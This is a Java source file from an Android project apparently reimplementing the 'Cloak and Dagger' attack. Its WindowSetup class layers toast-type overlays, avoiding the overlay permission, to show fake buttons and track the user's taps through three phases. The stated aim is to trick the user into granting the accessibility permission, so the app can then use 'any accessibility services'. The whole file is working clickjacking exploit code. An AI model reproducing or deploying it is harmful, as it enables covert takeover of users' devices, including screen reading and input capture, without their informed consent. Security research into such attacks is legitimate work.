package andrews.cloakanddagger;

import android.app.Activity;
import android.content.Context;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.view.Display;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

/**
 * Created by slothlord on 10/22/17.
 * The WindowSetup class creates a single instance of WindowManager which is used to control the
 * setup activity.
 */

public class WindowSetup {

    /**The view found by the passed in context is treated as a type TOAST to create an overlay and
     * avoid the SYSTEM_ALERT_WINDOW permission.
     */
    private int type =  WindowManager.LayoutParams.TYPE_TOAST;
    private int flags = 0;
    private static WindowManager manager;
    private int width;
    private int height;
    volatile boolean fin = false;
    volatile View overlaying_view1, overlaying_view2, overlaying_view3, touch_view, padding;


    /**The constructor simply takes a context and applies it to the created WindowManager. The size of the
     * screen is then collected to format the toast view dimensions.
     * @param context
     */
    public WindowSetup(Context context) {
        manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = manager.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        width = size.x;
        height = size.y;
    }


    /**
     * startToast begins the first phase of acquiring the BIND_ACCESSIBILITY permission. An overlaying view, which
     * is only used to display a fake button, and a touch view, used to detect if the overlay view has been touched,
     * are created.
     * @param context
     */
    public void startToast(Context context) {

        final Context parent = context;

        manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

        padding = View.inflate(context, R.layout.padding_view, null);
        WindowManager.LayoutParams layoutParams_pad = new WindowManager.LayoutParams(width, height, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        layoutParams_pad.gravity = Gravity.FILL;
        manager.addView(padding, layoutParams_pad);


        overlaying_view1 = View.inflate(context, R.layout.activity_obscuring_toast, null);
        WindowManager.LayoutParams layoutParams_obs1 = new WindowManager.LayoutParams(width, 482, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT);
        layoutParams_obs1.gravity = Gravity.TOP;
        manager.addView(overlaying_view1, layoutParams_obs1);

        //The touch view is responsible for listening for a touch which calls phase2 when true
        touch_view = View.inflate(context, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch1 = new WindowManager.LayoutParams(width, height - height/3 + 53, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    System.out.println("!!!!!!!!!!!!!!!!!!!!!!Touch Detected!!!!!!!!!!!!!!!!!!");
                    startPhase2(parent);
                    fin = true;
                    return true;
                }
                return false;
            }
        });
        layoutParams_touch1.gravity = Gravity.BOTTOM;

        manager.addView(touch_view, layoutParams_touch1);
    }

    /**
     * startPhase2 does the same thing as phase 1 but the formatting of the two views is slightly different
      * @param context
     */
    private void startPhase2(Context context) {

        final Context parent = context;
        touch_view.setVisibility(View.GONE);

        overlaying_view2 = View.inflate(parent, R.layout.obscuring_toast2, null);
        WindowManager.LayoutParams layoutParams_obs2 = new WindowManager.LayoutParams(width, 310, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT);
        layoutParams_obs2.gravity = Gravity.TOP;

        manager.addView(overlaying_view2, layoutParams_obs2);
        overlaying_view1.setVisibility(View.GONE);

        //The touch view is responsible for listening for a touch which returns true when detected
        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch2 = new WindowManager.LayoutParams(width, height - height/3 + 225, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    System.out.println("!!!!!!!!!!!!!!!!!!!!!!Touch Detected!!!!!!!!!!!!!!!!!!");
                    startPhase3(parent);
                    return true;
                }
                return false;
            }
        });
        layoutParams_touch2.gravity = Gravity.BOTTOM;

        manager.addView(touch_view, layoutParams_touch2);

    }

    /**
     * startPhase 3 adjusts the format to keep the permission dialog buttons visible which allows the
     * permission to be granted. Once the button is pressed the app is free to use any accessibility
     * services.
     * @param context
     */
    private void startPhase3(Context context) {

        final Context parent = context;
        touch_view.setVisibility(View.GONE);

        overlaying_view3 = View.inflate(parent, R.layout.obscuring_toast3, null);
        WindowManager.LayoutParams layoutParams_obs3 = new WindowManager.LayoutParams(width, 230, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT);
        layoutParams_obs3.gravity = Gravity.BOTTOM;

        manager.addView(overlaying_view3, layoutParams_obs3);
        overlaying_view2.setVisibility(View.GONE);

        //The touch view is responsible for listening for a touch which returns true when detected
        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch3 = new WindowManager.LayoutParams(width, height/2 + 495, type, flags
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);

        padding.setVisibility(View.GONE);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    System.out.println("**********************************WE DID IT!**************************");
                    overlaying_view3.setVisibility(View.GONE);
                    touch_view.setVisibility(View.GONE);
                    return true;
                }
                return false;
            }
        });
        layoutParams_touch3.gravity = Gravity.TOP;

        manager.addView(touch_view, layoutParams_touch3);
    }

}
